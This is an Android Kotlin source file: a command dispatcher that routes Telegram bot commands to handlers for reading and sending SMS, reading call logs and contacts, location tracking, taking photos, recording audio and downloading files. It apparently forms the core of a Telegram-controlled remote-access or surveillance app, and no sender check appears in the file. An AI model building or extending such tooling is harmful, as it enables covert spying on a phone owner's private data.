package com.soll.domain.command

import android.content.Context
import com.soll.data.api.model.Message
import com.soll.data.local.entity.CommandLogEntity
import com.soll.data.repository.TelegramRepository
import com.soll.domain.command.handlers.*
import dagger.hilt.android.qualifiers.ApplicationContext
import timber.log.Timber
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandProcessor @Inject constructor(
    @ApplicationContext private val context: Context,
    private val telegramRepository: TelegramRepository
) {
    private val handlers: Map<String, CommandHandler> by lazy {
        mapOf(
            // System commands
            "start" to StartHandler(context, telegramRepository),
            "help" to HelpHandler(context, telegramRepository),
            "ping" to PingHandler(context, telegramRepository),
            "status" to StatusHandler(context, telegramRepository),
            "info" to InfoHandler(context, telegramRepository),
            "logs" to LogsHandler(context, telegramRepository),
            "storage" to StorageHandler(context, telegramRepository),

            // File operations
            "files" to FilesHandler(context, telegramRepository),
            "download" to DownloadHandler(context, telegramRepository),

            // SMS & Calls
            "sms" to SmsHandler(context, telegramRepository),
            "sms_send" to SmsSendHandler(context, telegramRepository),
            "calls" to CallsHandler(context, telegramRepository),
            "call" to CallHandler(context, telegramRepository),
            "contacts" to ContactsHandler(context, telegramRepository),

            // Location, Camera & Recording
            "location" to LocationHandler(context, telegramRepository),
            "photo" to PhotoHandler(context, telegramRepository),
            "record" to RecordHandler(context, telegramRepository),

            // Device control
            "notify" to NotifyHandler(context, telegramRepository),
            "vibrate" to VibrateHandler(context, telegramRepository),
            "flashlight" to FlashlightHandler(context, telegramRepository),
            "volume" to VolumeHandler(context, telegramRepository),
            "alarm" to AlarmHandler(context, telegramRepository),
            "brightness" to BrightnessHandler(context, telegramRepository),
            "bluetooth" to BluetoothHandler(context, telegramRepository),
            "wifi" to WifiHandler(context, telegramRepository)
        )
    }

    suspend fun processCommand(
        command: String,
        args: String?,
        message: Message
    ) {
        val handler = handlers[command.lowercase()]
        val startTime = System.currentTimeMillis()

        if (handler == null) {
            // Unknown command
            val response = "Unknown command: /$command\n\nUse /help to see available commands."
            telegramRepository.sendMessage(message.chat.id, response)

            telegramRepository.logCommand(
                command = command,
                args = args,
                chatId = message.chat.id,
                userId = message.from?.id,
                username = message.from?.username,
                status = CommandLogEntity.STATUS_ERROR,
                errorMessage = "Unknown command"
            )
            return
        }

        try {
            Timber.d("Executing command: $command")
            handler.execute(message, args)

            telegramRepository.logCommand(
                command = command,
                args = args,
                chatId = message.chat.id,
                userId = message.from?.id,
                username = message.from?.username,
                status = CommandLogEntity.STATUS_SUCCESS,
                executionTimeMs = System.currentTimeMillis() - startTime
            )
        } catch (e: Exception) {
            Timber.e(e, "Error executing command: $command")

            val errorResponse = "Error executing /$command: ${e.message}"
            telegramRepository.sendMessage(message.chat.id, errorResponse)

            telegramRepository.logCommand(
                command = command,
                args = args,
                chatId = message.chat.id,
                userId = message.from?.id,
                username = message.from?.username,
                status = CommandLogEntity.STATUS_ERROR,
                errorMessage = e.message,
                executionTimeMs = System.currentTimeMillis() - startTime
            )
        }
    }

    fun getAvailableCommands(): List<Pair<String, String>> {
        return handlers.map { (name, handler) ->
            name to handler.description
        }
    }
}
